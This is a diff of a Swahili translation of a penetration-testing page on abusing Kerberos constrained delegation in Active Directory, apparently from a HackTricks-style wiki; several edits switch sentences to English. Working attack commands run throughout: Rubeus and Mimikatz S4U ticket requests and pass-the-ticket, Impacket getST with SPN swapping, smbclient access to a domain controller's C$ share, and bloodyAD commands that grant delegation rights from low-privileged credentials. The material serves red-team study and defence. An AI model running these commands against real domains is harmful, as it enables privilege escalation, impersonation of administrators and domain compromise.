@@ -4,18 +4,18 @@
 
 ## Constrained Delegation
 
-Kwa kutumia hili, Domain admin anaweza **kuruhusu** kompyuta **kuiga mtumiaji au kompyuta** dhidi ya **service** yoyote ya mashine.
+Kwa kutumia hili, Domain admin anaweza **kuruhusu** kompyuta **impersonate a user or computer** dhidi ya **service** yoyote ya mashine.
 
-- **Service for User to self (_S4U2self_):** Ikiwa akaunti ya **service account** ina thamani ya _userAccountControl_ inayojumuisha [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), basi inaweza kupata TGS kwa ajili yake mwenyewe (service) kwa niaba ya mtumiaji mwingine yeyote.
-- **Service for User to Proxy(_S4U2proxy_):** Akaunti ya **service account** inaweza kupata TGS kwa niaba ya mtumiaji yoyote kwa huduma iliyoainishwa katika **msDS-AllowedToDelegateTo.** Ili kufanya hivyo, kwanza inahitaji TGS kutoka kwa mtumiaji huyo kwa ajili yake mwenyewe, lakini inaweza kutumia S4U2self kupata TGS hiyo kabla ya kuomba nyingine.
+- **Service for User to self (_S4U2self_):** If a **service account** has a _userAccountControl_ value containing [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
+- **Service for User to Proxy(_S4U2proxy_):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
 
-**Kumbuka**: Ikiwa mtumiaji amewekwa alama kama ‘_Account is sensitive and cannot be delegated_’ katika AD, hautaweza **kuiga** (impersonate) wao.
+**Note**: Ikiwa mtumiaji ametiwa alama ‘_Account is sensitive and cannot be delegated_’ katika AD, hautakuwa na uwezo wa kuimpersonate wao.
 
-Hii ina maana kwamba ikiwa utadhuru **hash ya service** unaweza **kuiga watumiaji** na kupata **access** kwa niaba yao kwa huduma yoyote kwenye mashine zilizotajwa (inawezekana **privesc**).
+Hii inamaanisha kwamba ikiwa utacomproamise hash ya service unaweza kuimpersonate watumiaji na kupata access kwa niaba yao kwa service yoyote juu ya mashine zilizotajwa (inawezekana privesc).
 
-Zaidi ya hayo, **hutaweza kupata tu access kwa service ambayo mtumiaji anaweza kuigiza, bali pia kwa huduma yoyote** kwa sababu SPN (jina la service linalotakiwa) halikaiangaliwa (sehemu hii katika tiketi haifichwi/imetiwa saini). Kwa hivyo, ikiwa una access kwa **CIFS service** unaweza pia kupata access kwa **HOST service** kwa kutumia bendera `/altservice` katika Rubeus kwa mfano. Udhaifu sawa wa kubadilisha SPN unatumika vibaya na **Impacket getST -altservice** na zana nyingine.
+Zaidi ya hayo, hautakuwa na access tu kwa service ambayo mtumiaji anaweza kuimpersonate, bali pia kwa service yoyote kwa sababu SPN (the service name requested) haichekiwi (katika tiketi sehemu hii haijaencrypted/signed). Kwa hivyo, ikiwa una access kwa CIFS service unaweza pia kupata access kwa HOST service kwa kutumia flag /altservice katika Rubeus kwa mfano. Udhaifu huu wa SPN swapping pia unatumiwa na Impacket getST -altservice na tooling nyingine.
 
-Pia, **LDAP service access on DC**, ndiyo inahitajika kutekeleza **DCSync**.
+Pia, access ya LDAP service kwenye DC ndio inahitajika kutekeleza DCSync.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -29,18 +29,18 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
-### Vidokezo kuhusu Cross-domain constrained delegation (2025+)
+### Cross-domain constrained delegation notes (2025+)
 
-Tangu **Windows Server 2012/2012 R2** KDC inaunga mkono **constrained delegation across domains/forests** kupitia virutubisho vya S4U2Proxy. Maboresho ya kisasa (Windows Server 2016–2025) yanabaki na tabia hii na yanaongeza PAC SIDs mbili kuashiria protocol transition:
+Since **Windows Server 2012/2012 R2** the KDC supports **constrained delegation across domains/forests** via S4U2Proxy extensions. Modern builds (Windows Server 2016–2025) keep this behaviour and add two PAC SIDs to signal protocol transition:
 
-- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wakati mtumiaji alitimiza uidhinishaji kwa kawaida.
-- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wakati service ilidhibitisha utambulisho kupitia protocol transition.
+- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wakati mtumiaji alithibitisha kawaida.
+- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wakati service ilidai utambulisho kupitia protocol transition.
 
-Tegemea `SERVICE_ASSERTED_IDENTITY` ndani ya PAC wakati protocol transition inapotumika across domains, ikithibitisha hatua ya S4U2Proxy ilifanikiwa.
+Tegemea `SERVICE_ASSERTED_IDENTITY` ndani ya PAC wakati protocol transition inatumiwa across domains, ikithibitisha hatua ya S4U2Proxy ilifanikiwa.
 
-### Impacket / Linux zana (altservice & full S4U)
+### Impacket / Linux tooling (altservice & full S4U)
 
-Impacket za hivi majuzi (0.11.x+) zinaonyesha mnyororo ule ule wa S4U na SPN swapping kama Rubeus:
+Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:
 ```bash
 # Get TGT for delegating service (hash/aes)
 getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d
@@ -54,17 +54,17 @@ getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
 export KRB5CCNAME=Administrator.ccache
 smbclient -k //dc.contoso.local/C$ -c 'dir'
 ```
-Ikiwa unapendelea kuunda kwa udanganyifu ST ya mtumiaji kwanza (kwa mfano, offline hash tu), tumia **ticketer.py** pamoja na **getST.py** kwa S4U2Proxy. Angalia Impacket issue wazi #1713 kwa mashaka ya sasa (KRB_AP_ERR_MODIFIED wakati ST iliyoundwa kwa udanganyifu haisi kuendana na ufunguo wa SPN).
+Ikiwa unapendelea forging ST ya mtumiaji kwanza (kwa mfano, offline hash pekee), tumia pamoja **ticketer.py** na **getST.py** kwa S4U2Proxy. Angalia Impacket issue #1713 iliyofunguliwa kwa quirks za sasa (KRB_AP_ERR_MODIFIED wakati forged ST haitalingani na SPN key).
 
-### Ku-otomatisha usanidi wa delegation kutoka kwa low-priv creds
+### Kuendesha otomatiki uundaji wa delegation kutoka kwa creds za ruhusa ndogo
 
-Ikiwa tayari unamiliki **GenericAll/WriteDACL** juu ya kompyuta au akaunti ya huduma, unaweza kusukuma sifa zinazohitajika kwa mbali bila RSAT ukitumia **bloodyAD** (2024+):
+Ikiwa tayari una **GenericAll/WriteDACL** juu ya kompyuta au service account, unaweza kusukuma sifa zinazohitajika kwa mbali bila RSAT ukitumia **bloodyAD** (2024+):
 ```bash
 # Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
 ```
-Hii inakuwezesha kujenga constrained delegation path kwa privesc bila DA privileges mara tu utaweza kuandika attributes hizo.
+Hii inakuwezesha kujenga constrained delegation path kwa privesc bila ruhusa za DA mara tu utaweza kuandika sifa hizo.
 
 - Hatua 1: **Pata TGT ya huduma iliyoruhusiwa**
 ```bash:Get TGT
@@ -86,11 +86,11 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Kuna **njia nyingine za kupata TGT ticket** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta kama Printer Bug na unconstrain delegation, NTLM relaying na Active Directory Certificate Service abuse
+> Kuna **njia nyingine za kupata TGT ticket** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta, kama Printer Bug na unconstrain delegation, NTLM relaying na Active Directory Certificate Service abuse
 >
-> **Kuwa na TGT ticket hiyo (au hashed) tu unaweza kutekeleza shambulio hili bila kuathiri kompyuta nzima.**
+> **Kwa kuwa na ile TGT ticket (au hashed) tu unaweza kufanya attack hii bila compromising kompyuta nzima.**
 
-- Hatua2: **Pata TGS kwa huduma kwa kuigiza mtumiaji**
+- Hatua2: **Pata TGS kwa ajili ya huduma ukijifanya mtumiaji**
 ```bash:Using Rubeus
 # Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -118,7 +118,7 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-[**Taarifa zaidi kwenye ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) na [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) na [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 
 ## Marejeo
 - [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
